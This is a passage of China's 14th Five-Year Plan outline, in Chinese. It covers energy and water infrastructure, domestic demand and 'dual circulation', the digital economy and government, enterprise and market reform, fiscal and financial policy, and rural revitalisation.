改革，全面深化空管体制改革，推动公路收费制度和养护体制改革。 第三节 构建现代能源体系 推进能源革命，建设清洁低碳、安全高效的能源体系，提高能源供给保障能力。加快发展非化石能源，坚持集中式和分布式并举，大力提升风电、光伏发电规模，加快发展东中部分布式能源，有序发展海上风电，加快西南水电基地建设，安全稳妥推动沿海核电建设，建设一批多能互补的清洁能源基地，非化石能源占能源消费总量比重提高到20%左右。推动煤炭生产向资源富集地区集中，合理控制煤电建设规模和发展节奏，推进以电代煤。有序放开油气勘探开发市场准入，加快深海、深层和非常规油气资源利用，推动油气增储上产。因地制宜开发利用地热能。提高特高压输电通道利用率。加快电网基础设施智能化改造和智能微电网建设，提高电力系统互补互济和智能调节能力，加强源网荷储衔接，提升清洁能源消纳和存储能力，提升向边远地区输配电能力，推进煤电灵活性改造，加快抽水蓄能电站建设和新型储能技术规模化应用。完善煤炭跨区域运输通道和集疏运体系，加快建设天然气主干管道，完善油气互联互通网络。 第四节 加强水利基础设施建设 立足流域整体和水资源空间均衡配置，加强跨行政区河流水系治理保护和骨干工程建设，强化大中小微水利设施协调配套，提升水资源优化配置和水旱灾害防御能力。坚持节水优先，完善水资源配置体系，建设水资源配置骨干项目，加强重点水源和城市应急备用水源工程建设。实施防洪提升工程，解决防汛薄弱环节，加快防洪控制性枢纽工程建设和中小河流治理、病险水库除险加固，全面推进堤防和蓄滞洪区建设。加强水源涵养区保护修复，加大重点河湖保护和综合治理力度，恢复水清岸绿的水生态体系。 第四篇 形成强大国内市场 构建新发展格局 坚持扩大内需这个战略基点，加快培育完整内需体系，把实施扩大内需战略同深化供给侧结构性改革有机结合起来，以创新驱动、高质量供给引领和创造新需求，加快构建以国内大循环为主体、国内国际双循环相互促进的新发展格局。 第十二章 畅通国内大循环 依托强大国内市场，贯通生产、分配、流通、消费各环节，形成需求牵引供给、供给创造需求的更高水平动态平衡，促进国民经济良性循环。 第一节 提升供给体系适配性 深化供给侧结构性改革，提高供给适应引领创造新需求能力。适应个性化、差异化、品质化消费需求，推动生产模式和产业组织方式创新，持续扩大优质消费品、中高端产品供给和教育、医疗、养老等服务供给，提升产品服务质量和客户满意度，推动供需协调匹配。优化提升供给结构，促进农业、制造业、服务业、能源资源等产业协调发展。完善产业配套体系，加快自然垄断行业竞争性环节市场化，实现上下游、产供销有效衔接。健全市场化法治化化解过剩产能长效机制，完善企业兼并重组法律法规和配套政策。建立健全质量分级制度，加快标准升级迭代和国际标准转化应用。开展中国品牌创建行动，保护发展中华老字号，提升自主品牌影响力和竞争力，率先在化妆品、服装、家纺、电子产品等消费品领域培育一批高端品牌。 第二节 促进资源要素顺畅流动 破除制约要素合理流动的堵点，矫正资源要素失衡错配，从源头上畅通国民经济循环。提高金融服务实体经济能力，健全实体经济中长期资金供给制度安排，创新直达实体经济的金融产品和服务，增强多层次资本市场融资功能。实施房地产市场平稳健康发展长效机制，促进房地产与实体经济均衡发展。有效提升劳动者技能，提高就业质量和收入水平，形成人力资本提升和产业转型升级良性循环。健全城乡要素自由流动机制，构建区域产业梯度转移格局，促进城乡区域良性互动。 第三节 强化流通体系支撑作用 深化流通体制改革，畅通商品服务流通渠道，提升流通效率，降低全社会交易成本。加快构建国内统一大市场，对标国际先进规则和最佳实践优化市场环境，促进不同地区和行业标准、规则、政策协调统一，有效破除地方保护、行业垄断和市场分割。建设现代物流体系，加快发展冷链物流，统筹物流枢纽设施、骨干线路、区域分拨中心和末端配送节点建设，完善国家物流枢纽、骨干冷链物流基地设施条件，健全县乡村三级物流配送体系，发展高铁快运等铁路快捷货运产品，加强国际航空货运能力建设，提升国际海运竞争力。优化国际物流通道，加快形成内外联通、安全高效的物流网络。完善现代商贸流通体系，培育一批具有全球竞争力的现代流通企业，支持便利店、农贸市场等商贸流通设施改造升级，发展无接触交易服务，加强商贸流通标准化建设和绿色发展。加快建立储备充足、反应迅速、抗冲击能力强的应急物流体系。 第四节 完善促进国内大循环的政策体系 保持合理的财政支出力度和赤字率水平，完善减税降费政策，构建有利于企业扩大投资、增加研发投入、调节收入分配、减轻消费者负担的税收制度。保持流动性合理充裕，保持货币供应量和社会融资规模增速同名义经济增速基本匹配，创新结构性政策工具，引导金融机构加大对重点领域和薄弱环节支持力度，规范发展消费信贷。推动产业政策向普惠化和功能性转型，强化竞争政策基础性地位，支持技术创新和结构升级。健全与经济发展水平相适应的收入分配、社会保障和公共服务制度。 第十三章 促进国内国际双循环 立足国内大循环，协同推进强大国内市场和贸易强国建设，形成全球资源要素强大引力场，促进内需和外需、进口和出口、引进外资和对外投资协调发展，加快培育参与国际合作和竞争新优势。 第一节 推动进出口协同发展 完善内外贸一体化调控体系，促进内外贸法律法规、监管体制、经营资质、质量标准、检验检疫、认证认可等相衔接，推进同线同标同质。降低进口关税和制度性成本，扩大优质消费品、先进技术、重要设备、能源资源等进口，促进进口来源多元化。完善出口政策，优化出口商品质量和结构，稳步提高出口附加值。优化国际市场布局，引导企业深耕传统出口市场、拓展新兴市场，扩大与周边国家贸易规模，稳定国际市场份额。推动加工贸易转型升级，深化外贸转型升级基地、海关特殊监管区域、贸易促进平台、国际营销服务网络建设，加快发展跨境电商、市场采购贸易等新模式，鼓励建设海外仓，保障外贸产业链供应链畅通运转。创新发展服务贸易，推进服务贸易创新发展试点开放平台建设，提升贸易数字化水平。实施贸易投资融合工程。办好中国国际进口博览会、中国进出口商品交易会、中国国际服务贸易交易会等展会。 第二节 提高国际双向投资水平 坚持引进来和走出去并重，以高水平双向投资高效利用全球资源要素和市场空间，完善产业链供应链保障机制，推动产业竞争力提升。更大力度吸引和利用外资，有序推进电信、互联网、教育、文化、医疗等领域相关业务开放。全面优化外商投资服务，加强外商投资促进和保护，发挥重大外资项目示范效应，支持外资加大中高端制造、高新技术、传统制造转型升级、现代服务等领域和中西部地区投资，支持外资企业设立研发中心和参与承担国家科技计划项目。鼓励外资企业利润再投资。坚持企业主体，创新境外投资方式，优化境外投资结构和布局，提升风险防范能力和收益水平。完善境外生产服务网络和流通体系，加快金融、咨询、会计、法律等生产性服务业国际化发展，推动中国产品、服务、技术、品牌、标准走出去。支持企业融入全球产业链供应链，提高跨国经营能力和水平。引导企业加强合规管理，防范化解境外政治、经济、安全等各类风险。推进多双边投资合作机制建设，健全促进和保障境外投资政策和服务体系，推动境外投资立法。 第十四章 加快培育完整内需体系 深入实施扩大内需战略，增强消费对经济发展的基础性作用和投资对优化供给结构的关键性作用，建设消费和投资需求旺盛的强大国内市场。 第一节 全面促进消费 顺应居民消费升级趋势，把扩大消费同改善人民生活品质结合起来，促进消费向绿色、健康、安全发展，稳步提高居民消费水平。提升传统消费，加快推动汽车等消费品由购买管理向使用管理转变，健全强制报废制度和废旧家电、消费电子等耐用消费品回收处理体系，促进住房消费健康发展。培育新型消费，发展信息消费、数字消费、绿色消费，鼓励定制、体验、智能、时尚消费等新模式新业态发展。发展服务消费，放宽服务消费领域市场准入，推动教育培训、医疗健康、养老托育、文旅体育等消费提质扩容，加快线上线下融合发展。适当增加公共消费，提高公共服务支出效率。扩大节假日消费，完善节假日制度，全面落实带薪休假制度。培育建设国际消费中心城市，打造一批区域消费中心。完善城乡融合消费网络，扩大电子商务进农村覆盖面，改善县域消费环境，推动农村消费梯次升级。完善市内免税店政策，规划建设一批中国特色市内免税店。采取增加居民收入与减负并举等措施，不断扩大中等收入群体，持续释放消费潜力。强化消费者权益保护，完善质量标准和后评价体系，健全缺陷产品召回、产品伤害监测、产品质量担保等制度，完善多元化消费维权机制和纠纷解决机制。 第二节 拓展投资空间 优化投资结构，提高投资效率，保持投资合理增长。加快补齐基础设施、市政工程、农业农村、公共安全、生态环保、公共卫生、物资储备、防灾减灾、民生保障等领域短板，推动企业设备更新和技术改造，扩大战略性新兴产业投资。推进既促消费惠民生又调结构增后劲的新型基础设施、新型城镇化、交通水利等重大工程建设。面向服务国家重大战略，实施川藏铁路、西部陆海新通道、国家水网、雅鲁藏布江下游水电开发、星际探测、北斗产业化等重大工程，推进重大科研设施、重大生态系统保护修复、公共卫生应急保障、重大引调水、防洪减灾、送电输气、沿边沿江沿海交通等一批强基础、增功能、利长远的重大项目建设。深化投融资体制改革，发挥政府投资撬动作用，激发民间投资活力，形成市场主导的投资内生增长机制。健全项目谋划、储备、推进机制，加大资金、用地等要素保障力度，加快投资项目落地见效。规范有序推进政府和社会资本合作（PPP），推动基础设施领域不动产投资信托基金（REITs）健康发展，有效盘活存量资产，形成存量资产和新增投资的良性循环。 第五篇 加快数字化发展 建设数字中国 迎接数字时代，激活数据要素潜能，推进网络强国建设，加快建设数字经济、数字社会、数字政府，以数字化转型整体驱动生产方式、生活方式和治理方式变革。 第十五章 打造数字经济新优势 充分发挥海量数据和丰富应用场景优势，促进数字技术与实体经济深度融合，赋能传统产业转型升级，催生新产业新业态新模式，壮大经济发展新引擎。 第一节 加强关键数字技术创新应用 聚焦高端芯片、操作系统、人工智能关键算法、传感器等关键领域，加快推进基础理论、基础算法、装备材料等研发突破与迭代应用。加强通用处理器、云计算系统和软件核心技术一体化研发。加快布局量子计算、量子通信、神经芯片、DNA存储等前沿技术，加强信息科学与生命科学、材料等基础学科的交叉创新，支持数字技术开源社区等创新联合体发展，完善开源知识产权和法律体系，鼓励企业开放软件源代码、硬件设计和应用服务。 第二节 加快推动数字产业化 培育壮大人工智能、大数据、区块链、云计算、网络安全等新兴数字产业，提升通信设备、核心电子元器件、关键软件等产业水平。构建基于5G的应用场景和产业生态，在智能交通、智慧物流、智慧能源、智慧医疗等重点领域开展试点示范。鼓励企业开放搜索、电商、社交等数据，发展第三方大数据服务产业。促进共享经济、平台经济健康发展。 第三节 推进产业数字化转型 实施“上云用数赋智”行动，推动数据赋能全产业链协同转型。在重点行业和区域建设若干国际水准的工业互联网平台和数字化转型促进中心，深化研发设计、生产制造、经营管理、市场服务等环节的数字化应用，培育发展个性定制、柔性制造等新模式，加快产业园区数字化改造。深入推进服务业数字化转型，培育众包设计、智慧物流、新零售等新增长点。加快发展智慧农业，推进农业生产经营和管理服务数字化改造。 第十六章 加快数字社会建设步伐 适应数字技术全面融入社会交往和日常生活新趋势，促进公共服务和社会运行方式创新，构筑全民畅享的数字生活。 第一节 提供智慧便捷的公共服务 聚焦教育、医疗、养老、抚幼、就业、文体、助残等重点领域，推动数字化服务普惠应用，持续提升群众获得感。推进学校、医院、养老院等公共服务机构资源数字化，加大开放共享和应用力度。推进线上线下公共服务共同发展、深度融合，积极发展在线课堂、互联网医院、智慧图书馆等，支持高水平公共服务机构对接基层、边远和欠发达地区，扩大优质公共服务资源辐射覆盖范围。加强智慧法院建设。鼓励社会力量参与“互联网+公共服务”，创新提供服务模式和产品。 第二节 建设智慧城市和数字乡村 以数字化助推城乡发展和治理模式创新，全面提高运行效率和宜居度。分级分类推进新型智慧城市建设，将物联网感知设施、通信系统等纳入公共基础设施统一规划建设，推进市政公用设施、建筑等物联网应用和智能化改造。完善城市信息模型平台和运行管理服务平台，构建城市数据资源体系，推进城市数据大脑建设。探索建设数字孪生城市。加快推进数字乡村建设，构建面向农业农村的综合信息服务体系，建立涉农信息普惠服务机制，推动乡村管理服务数字化。 第三节 构筑美好数字生活新图景 推动购物消费、居家生活、旅游休闲、交通出行等各类场景数字化，打造智慧共享、和睦共治的新型数字生活。推进智慧社区建设，依托社区数字化平台和线下社区服务机构，建设便民惠民智慧服务圈，提供线上线下融合的社区生活服务、社区治理及公共服务、智能小区等服务。丰富数字生活体验，发展数字家庭。加强全民数字技能教育和培训，普及提升公民数字素养。加快信息无障碍建设，帮助老年人、残疾人等共享数字生活。 第十七章 提高数字政府建设水平 将数字技术广泛应用于政府管理服务，推动政府治理流程再造和模式优化，不断提高决策科学性和服务效率。 第一节 加强公共数据开放共享 建立健全国家公共数据资源体系，确保公共数据安全，推进数据跨部门、跨层级、跨地区汇聚融合和深度利用。健全数据资源目录和责任清单制度，提升国家数据共享交换平台功能，深化国家人口、法人、空间地理等基础信息资源共享利用。扩大基础公共信息数据安全有序开放，探索将公共数据服务纳入公共服务体系，构建统一的国家公共数据开放平台和开发利用端口，优先推动企业登记监管、卫生、交通、气象等高价值数据集向社会开放。开展政府数据授权运营试点，鼓励第三方深化对公共数据的挖掘利用。 第二节 推动政务信息化共建共用 加大政务信息化建设统筹力度，健全政务信息化项目清单，持续深化政务信息系统整合，布局建设执政能力、依法治国、经济治理、市场监管、公共安全、生态环境等重大信息系统，提升跨部门协同治理能力。完善国家电子政务网络，集约建设政务云平台和数据中心体系，推进政务信息系统云迁移。加强政务信息化建设快速迭代，增强政务信息系统快速部署能力和弹性扩展能力。 第三节 提高数字化政务服务效能 全面推进政府运行方式、业务流程和服务模式数字化智能化。深化“互联网+政务服务”，提升全流程一体化在线服务平台功能。加快构建数字技术辅助政府决策机制，提高基于高频大数据精准动态监测预测预警水平。强化数字技术在公共卫生、自然灾害、事故灾难、社会安全等突发公共事件应对中的运用，全面提升预警和应急处置能力。 第十八章 营造良好数字生态 坚持放管并重，促进发展与规范管理相统一，构建数字规则体系，营造开放、健康、安全的数字生态。 第一节 建立健全数据要素市场规则 统筹数据开发利用、隐私保护和公共安全，加快建立数据资源产权、交易流通、跨境传输和安全保护等基础制度和标准规范。建立健全数据产权交易和行业自律机制，培育规范的数据交易平台和市场主体，发展数据资产评估、登记结算、交易撮合、争议仲裁等市场运营体系。加强涉及国家利益、商业秘密、个人隐私的数据保护，加快推进数据安全、个人信息保护等领域基础性立法，强化数据资源全生命周期安全保护。完善适用于大数据环境下的数据分类分级保护制度。加强数据安全评估，推动数据跨境安全有序流动。 第二节 营造规范有序的政策环境 构建与数字经济发展相适应的政策法规体系。健全共享经济、平台经济和新个体经济管理规范，清理不合理的行政许可、资质资格事项，支持平台企业创新发展、增强国际竞争力。依法依规加强互联网平台经济监管，明确平台企业定位和监管规则，完善垄断认定法律规范，打击垄断和不正当竞争行为。探索建立无人驾驶、在线医疗、金融科技、智能配送等监管框架，完善相关法律法规和伦理审查规则。健全数字经济统计监测体系。 第三节 加强网络安全保护 健全国家网络安全法律法规和制度标准，加强重要领域数据资源、重要网络和信息系统安全保障。建立健全关键信息基础设施保护体系，提升安全防护和维护政治安全能力。加强网络安全风险评估和审查。加强网络安全基础设施建设，强化跨领域网络安全信息共享和工作协同，提升网络安全威胁发现、监测预警、应急指挥、攻击溯源能力。加强网络安全关键技术研发，加快人工智能安全技术创新，提升网络安全产业综合竞争力。加强网络安全宣传教育和人才培养。 第四节 推动构建网络空间命运共同体 推进网络空间国际交流与合作，推动以联合国为主渠道、以联合国宪章为基本原则制定数字和网络空间国际规则。推动建立多边、民主、透明的全球互联网治理体系，建立更加公平合理的网络基础设施和资源治理机制。积极参与数据安全、数字货币、数字税等国际规则和数字技术标准制定。推动全球网络安全保障合作机制建设，构建保护数据要素、处置网络安全事件、打击网络犯罪的国际协调合作机制。向欠发达国家提供技术、设备、服务等数字援助，使各国共享数字时代红利。积极推进网络文化交流互鉴。 第六篇 全面深化改革 构建高水平社会主义市场经济体制 坚持和完善社会主义基本经济制度，充分发挥市场在资源配置中的决定性作用，更好发挥政府作用，推动有效市场和有为政府更好结合。 第十九章 激发各类市场主体活力 毫不动摇巩固和发展公有制经济，毫不动摇鼓励、支持、引导非公有制经济发展，培育更有活力、创造力和竞争力的市场主体。 第一节 加快国有经济布局优化和结构调整 围绕服务国家战略，坚持有进有退、有所为有所不为，加快国有经济布局优化、结构调整和战略性重组，增强国有经济竞争力、创新力、控制力、影响力、抗风险能力，做强做优做大国有资本和国有企业。发挥国有经济战略支撑作用，推动国有经济进一步聚焦战略安全、产业引领、国计民生、公共服务等功能，调整盘活存量资产，优化增量资本配置，向关系国家安全、国民经济命脉的重要行业集中，向提供公共服务、应急能力建设和公益性等关系国计民生的重要行业集中，向前瞻性战略性新兴产业集中。对充分竞争领域的国有经济，强化资本收益目标和财务硬约束，增强流动性，完善国有资本优化配置机制。建立布局结构调整长效机制，动态发布国有经济布局优化和结构调整指引。 第二节 推动国有企业完善中国特色现代企业制度 坚持党对国有企业的全面领导，促进加强党的领导和完善公司治理相统一，加快建立权责法定、权责透明、协调运转、有效制衡的公司治理机制。加强董事会建设，落实董事会职权，使董事会成为企业经营决策主体。按照完善治理、强化激励、突出主业、提高效率的要求，深化国有企业混合所有制改革，深度转换经营机制，对混合所有制企业探索实行有别于国有独资、全资公司的治理机制和监管制度。推行经理层成员任期制和契约化管理，完善市场化薪酬分配机制，灵活开展多种形式的中长期激励。 第三节 健全管资本为主的国有资产监管体制 坚持授权与监管相结合、放活与管好相统一，大力推进国资监管理念、重点、方式等多方位转变。优化管资本方式，全面实行清单管理，深入开展分类授权放权，注重通过法人治理结构履职，加强事中事后监管。深化国有资本投资、运营公司改革，科学合理界定政府及国资监管机构，国有资本投资、运营公司和所持股企业的权利边界。健全协同高效的监督机制，严格责任追究，切实防止国有资产流失。加快推进经营性国有资产集中统一监管。 第四节 优化民营企业发展环境 健全支持民营企业发展的法治环境、政策环境和市场环境，依法平等保护民营企业产权和企业家权益。保障民营企业依法平等使用资源要素、公开公平公正参与竞争、同等受到法律保护。进一步放宽民营企业市场准入，破除招投标等领域各种壁垒。创新金融支持民营企业政策工具，健全融资增信支持体系，对民营企业信用评级、发债一视同仁，降低综合融资成本。完善促进中小微企业和个体工商户发展的政策体系，加大税费优惠和信贷支持力度。构建亲清政商关系，建立规范化政企沟通渠道。健全防范和化解拖欠中小企业账款长效机制。 第五节 促进民营企业高质量发展 鼓励民营企业改革创新，提升经营能力和管理水平。引导有条件的民营企业建立现代企业制度。支持民营企业开展基础研究和科技创新、参与关键核心技术研发和国家重大科技项目攻关。完善民营企业参与国家重大战略实施机制。推动民营企业守法合规经营，鼓励民营企业积极履行社会责任、参与社会公益和慈善事业。弘扬企业家精神，实施年轻一代民营企业家健康成长促进计划。 第二十章 建设高标准市场体系 实施高标准市场体系建设行动，健全市场体系基础制度，坚持平等准入、公正监管、开放有序、诚信守法，形成高效规范、公平竞争的国内统一市场。 第一节 全面完善产权制度 健全归属清晰、权责明确、保护严格、流转顺畅的现代产权制度。实施民法典，制修订物权、债权、股权等产权法律法规，明晰产权归属、完善产权权能。健全以公平为原则的产权保护制度，依法平等保护国有、民营、外资等各种所有制企业产权。健全产权执法司法保护制度，完善涉企产权案件申诉、复核、重审等保护机制，推动涉企冤错案件依法甄别纠正常态化机制化，畅通涉政府产权纠纷反映和处理渠道。加强数据、知识、环境等领域产权制度建设，健全自然资源资产产权制度和法律法规。 第二节 推进要素市场化配置改革 建立健全城乡统一的建设用地市场，统筹推进农村土地征收、集体经营性建设用地入市、宅基地制度改革。改革土地计划管理方式，赋予省级政府更大用地自主权，探索建立全国性的建设用地、补充耕地指标跨区域交易机制。建立不同产业用地类型合理转换机制，增加混合产业用地供给。健全统一规范的人力资源市场体系，破除劳动力和人才在城乡、区域和不同所有制单位间的流动障碍，减少人事档案管理中的不合理限制。发展技术和数据要素市场。健全要素市场运行机制，完善交易规则和服务体系。深化公共资源交易平台整合共享。 第三节 强化竞争政策基础地位 坚持鼓励竞争、反对垄断，完善竞争政策框架，构建覆盖事前、事中、事后全环节的竞争政策实施机制。统筹做好增量审查与存量清理，强化公平竞争审查制度的刚性约束，完善公平竞争审查细则，持续清理废除妨碍全国统一市场和公平竞争的规定及做法。完善市场竞争状况评估制度，建立投诉举报和处理回应机制。加大反垄断和反不正当竞争执法司法力度，防止资本无序扩张。推进能源、铁路、电信、公用事业等行业竞争性环节市场化改革，放开竞争性业务准入，进一步引入市场竞争机制，加强对自然垄断业务的监管。 第四节 健全社会信用体系 建立健全信用法律法规和标准体系，制定公共信用信息目录和失信惩戒措施清单，完善失信主体信用修复机制。推广信用承诺制度。加强信用信息归集、共享、公开和应用，推广惠民便企信用产品与服务。建立公共信用信息和金融信息的共享整合机制。培育具有国际竞争力的企业征信机构和信用评级机构，加强征信监管，推动信用服务市场健康发展。加强信用信息安全管理，保障信用主体合法权益。建立健全政府失信责任追究制度。 第二十一章 建立现代财税金融体制 更好发挥财政在国家治理中的基础和重要支柱作用，增强金融服务实体经济能力，健全符合高质量发展要求的财税金融制度。 第一节 加快建立现代财政制度 深化预算管理制度改革，强化对预算编制的宏观指导和审查监督。加强财政资源统筹，推进财政支出标准化，强化预算约束和绩效管理。完善跨年度预算平衡机制，加强中期财政规划管理，增强国家重大战略任务财力保障。建立权责清晰、财力协调、区域均衡的中央和地方财政关系，适当加强中央在知识产权保护、养老保险、跨区域生态环境保护等方面事权，减少并规范中央和地方共同事权。健全省以下财政体制，增强基层公共服务保障能力。完善财政转移支付制度，优化转移支付结构，规范转移支付项目。完善权责发生制政府综合财务报告制度。建立健全规范的政府举债融资机制。 第二节 完善现代税收制度 优化税制结构，健全直接税体系，适当提高直接税比重。完善个人所得税制度，推进扩大综合征收范围，优化税率结构。聚焦支持稳定制造业、巩固产业链供应链，进一步优化增值税制度。调整优化消费税征收范围和税率，推进征收环节后移并稳步下划地方。规范完善税收优惠。推进房地产税立法，健全地方税体系，逐步扩大地方税政管理权。深化税收征管制度改革，建设智慧税务，推动税收征管现代化。 第三节 深化金融供给侧结构性改革 健全具有高度适应性、竞争力、普惠性的现代金融体系，构建金融有效支持实体经济的体制机制。建设现代中央银行制度，完善货币供应调控机制。稳妥推进数字货币研发。健全市场化利率形成和传导机制，完善央行政策利率体系，更好发挥贷款市场报价利率基准作用。优化金融体系结构，深化国有商业银行改革，加快完善中小银行和农村信用社治理结构，规范发展非银行金融机构，增强金融普惠性。改革优化政策性金融，强化服务国家战略和规划能力。深化保险公司改革，提高商业保险保障能力。健全金融机构公司治理，强化股东股权和关联交易监管。完善资本市场基础制度，健全多层次资本市场体系，大力发展机构投资者，提高直接融资特别是股权融资比重。全面实行股票发行注册制，建立常态化退市机制，提高上市公司质量。深化新三板改革。完善市场化债券发行机制，稳步扩大债券市场规模，丰富债券品种，发行长期国债和基础设施长期债券。完善投资者保护制度和存款保险制度。完善现代金融监管体系，补齐监管制度短板，在审慎监管前提下有序推进金融创新，健全风险全覆盖监管框架，提高金融监管透明度和法治化水平。稳妥发展金融科技，加快金融机构数字化转型。强化监管科技运用和金融创新风险评估，探索建立创新产品纠偏和暂停机制。 第二十二章 提升政府经济治理能力 加快转变政府职能，建设职责明确、依法行政的政府治理体系，创新和完善宏观调控，提高政府治理效能。 第一节 完善宏观经济治理 健全以国家发展规划为战略导向，以财政政策和货币政策为主要手段，就业、产业、投资、消费、环保、区域等政策紧密配合，目标优化、分工合理、高效协同的宏观经济治理体系。增强国家发展规划对公共预算、国土开发、资源配置等政策的宏观引导、统筹协调功能，健全宏观政策制定和执行机制，重视预期管理和引导，合理把握经济增长、就业、价格、国际收支等调控目标，在区间调控基础上加强定向调控、相机调控和精准调控。完善宏观调控政策体系，搞好跨周期政策设计，提高逆周期调节能力，促进经济总量平衡、结构优化、内外均衡。加强宏观经济治理数据库等建设，提升大数据等现代技术手段辅助治理能力，推进统计现代化改革。健全宏观经济政策评估评价制度和重大风险识别预警机制，畅通政策制定参与渠道，提高决策科学化、民主化、法治化水平。 第二节 构建一流营商环境 深化简政放权、放管结合、优化服务改革，全面实行政府权责清单制度，持续优化市场化法治化国际化营商环境。实施全国统一的市场准入负面清单制度，破除清单之外隐性准入壁垒，以服务业为重点进一步放宽准入限制。精简行政许可事项，减少归并资质资格许可，取消不必要的备案登记和年检认定，规范涉企检查。全面推行“证照分离”、“照后减证”改革，全面开展工程建设项目审批制度改革。改革生产许可制度，简化工业产品审批程序，实施涉企经营许可事项清单管理。建立便利、高效、有序的市场主体退出制度，简化普通注销程序，建立健全企业破产和自然人破产制度。创新政务服务方式，推进审批服务便民化。深化国际贸易“单一窗口”建设。完善营商环境评价体系。 第三节 推进监管能力现代化 健全以“双随机、一公开”监管和“互联网+监管”为基本手段、以重点监管为补充、以信用监管为基础的新型监管机制，推进线上线下一体化监管。严格市场监管、质量监管、安全监管，加强对食品药品、特种设备和网络交易、旅游、广告、中介、物业等的监管，强化要素市场交易监管，对新产业新业态实施包容审慎监管。深化市场监管综合行政执法改革，完善跨领域跨部门联动执法、协同监管机制。深化行业协会、商会和中介机构改革。加强社会公众、新闻媒体监督。 第七篇 坚持农业农村优先发展 全面推进乡村振兴 走中国特色社会主义乡村振兴道路，全面实施乡村振兴战略，强化以工补农、以城带乡，推动形成工农互促、城乡互补、协调发展、共同繁荣的新型工农城乡关系，加快农业农村现代化。 第二十三章 提高农业质量效益和竞争力 持续强化农业基础地位，深化农业供给侧结构性改革，强化质量导向，推动乡村产业振兴。 第一节 增强农业综合生产能力 夯实粮食生产能力基础，保障粮、棉、油、糖、肉、奶等重要农产品供给安全。坚持最严格的耕地保护制度，强化耕地数量保护和质量提升，严守18亿亩耕地红线，遏制耕地“非农化”、防止“非粮化”，规范耕地占补平衡，严禁占优补劣、占水田补旱地。以粮食生产功能区和重要农产品生产保护区为重点，建设国家粮食安全产业带，实施高标准农田建设工程，建成10.75亿亩集中连片高标准农田。实施黑土地保护工程，加强东北黑土地保护和地力恢复。推进大中型灌区节水改造和精细化管理，建设节水灌溉骨干工程，同步推进水价综合改革。加强大中型、智能化、复合型农业机械研发应用，农作物耕种收综合机械化率提高到75%。加强种质资源保护利用和种子库建设，确保种源安全。加强农业良种技术攻关，有序推进生物育种产业化应用，培育具有国际竞争力的种业龙头企业。完善农业科技创新体系，创新农技推广服务方式，建设智慧农业。加强动物防疫和农作物病虫害防治，强化农业气象服务。 第二节 深化农业结构调整 优化农业生产布局，建设优势农产品产业带和特色农产品优势区。推进粮经饲统筹、农林牧渔协调，优化种植业结构，大力发展现代畜牧业，促进水产生态健康养殖。积极发展设施农业，因地制宜发展林果业。深入推进优质粮食工程。推进农业绿色转型，加强产地环境保护治理，发展节水农业和旱作农业，深入实施农药化肥减量行动，治理农膜污染，提升农膜回收利用率，推进秸秆综合利用和畜禽粪污资源化利用。完善绿色农业标准体系，加强绿色食品、有机农产品和地理标志农产品认证管理。强化全过程农产品质量安全监管，健全追溯体系。建设现代农业产业园区和农业现代化示范区。 第三节 丰富乡村经济业态 发展县域经济，推进农村一二三产业融合发展，延长农业产业链条，发展各具特色的现代乡村富民产业。推动种养加结合和产业链再造，提高农产品加工业和农业生产性服务业发展水平，壮大休闲农业、乡村旅游、民宿经济等特色产业。加强农产品仓储保鲜和冷链物流设施建设，健全农村产权交易、商贸流通、检验检测认证等平台和智能标准厂房等设施，引导农村二三产业集聚发展。完善利益联结机制，通过“资源变资产、资金变股金、农民变股东”，让农民更多分享产业增值收益。 第二十四章 实施乡村建设行动 把乡村建设摆在社会主义现代化建设的重要位置，优化生产生活生态空间，持续改善村容村貌和人居环境，建设美丽宜居乡村。 第一节 强化乡村建设的规划引领 统筹县域城镇和村庄规划建设，通盘考虑土地利用、产业发展、居民点建设、人居环境整治、生态保护、防灾减灾和历史文化传承。科学编制县域村庄布局规划，因地制宜、分类推进村庄建设，规范开展全域土地综合整治，保护传统村落、民族村寨和乡村风貌，严禁随意撤并村庄搞大社区、违背农民意愿大拆大建。优化布局乡村生活空间，严格保护农业生产空间和乡村生态空间，科学划定养殖业适养、限养、禁养区域。鼓励有条件地区编制实用性村庄规划。 第二节 提升乡村基础设施和公共服务水平 以县域为基本单元推进城乡融合发展，强化县城综合服务能力和乡镇服务农民功能。健全城乡基础设施统一规划、统一建设、统一管护机制，推动市政公用设施向郊区乡村和规模较大中心镇延伸，完善乡村水、电、路、气、邮政通信、广播电视、物流等基础设施，提升农房建设质量。推进城乡基本公共服务标准统一、制度并轨，增加农村教育、医疗、养老、文化等服务供给，推进县域内教师医生交流轮岗，鼓励社会力量兴办农村公益事业。提高农民科技文化素质，推动乡村人才振兴。 第三节 改善农村人居环境 开展农村人居环境整治提升行动，稳步解决“垃圾围村”和乡村黑臭水体等突出环境问题。推进农村生活垃圾就地分类和资源化利用，以乡镇政府驻地和中心村为重点梯次推进农村生活污水治理。支持因地制宜推进农村厕所革命。推进农村水系综合整治。深入开展村庄清洁和绿化行动，实现村庄公共空间及庭院房屋、村庄周边干净整洁。 第二十五章 健全城乡融合发展体制机制 建立健全城乡要素平等交换、双向流动政策体系，促进要素更多向乡村流动，增强农业农村发展活力。 第一节 深化农业农村改革 巩固完善农村基本经营制度，落实第二轮土地承包到期后再延长30年政策，完善农村承包地所有权、承包权、经营权分置制度，进一步放活经营权。发展多种形式适度规模经营，加快培育家庭农场、农民合作社等新型农业经营主体，健全农业专业化社会化服务体系，实现小农户和现代农业有机衔接。深化农村宅基地制度改革试点，加快房地一体的宅基地确权颁证，探索宅基地所有权、资格权、使用权分置实现形式。积极探索实施农村集体经营性建设用地入市制度。允许农村集体在农民自愿前提下，依法把有偿收回的闲置宅基地、废弃的集体公益性建设用地转变为集体经营性建设用地入市。建立土地征收公共利益认定机制，缩小土地征收范围。深化农村集体产权制度改革，完善产权权能，将经营性资产量化到集体经济组织成员，发展壮大新型农村集体经济。切实减轻村级组织负担。发挥国家城乡融合发展试验区、农村改革试验区示范带动作用。 第二节 加强农业农村发展要素保障 健全农业农村投入保障制度，加大中央财政转移支付、土地出让收入、地方政府债券支持农业农村力度。健全农业支持保护制度，完善粮食主产区利益补偿机制，构建新型农业补贴政策体系，完善粮食最低收购价政策。深化供销合作社改革。完善农村用地保障机制，保障设施农业和乡村产业发展合理用地需求。健全农村金融服务体系，完善金融支农激励机制，扩大农村资产抵押担保融资范围，发展农业保险。允许入乡就业创业人员在原籍地或就业创业地落户并享受相关权益，建立科研人员入乡兼职兼薪和离岗创业制度。 第二十六章 实现巩固拓展脱贫攻坚成果同乡村振兴有效衔接 建立完善农村低收入人口和欠发达地区帮扶机制，保持主要帮扶政策和财政投入力度总体稳定，接续推进脱贫地区发展。 第一节 巩固提升脱贫攻坚成果 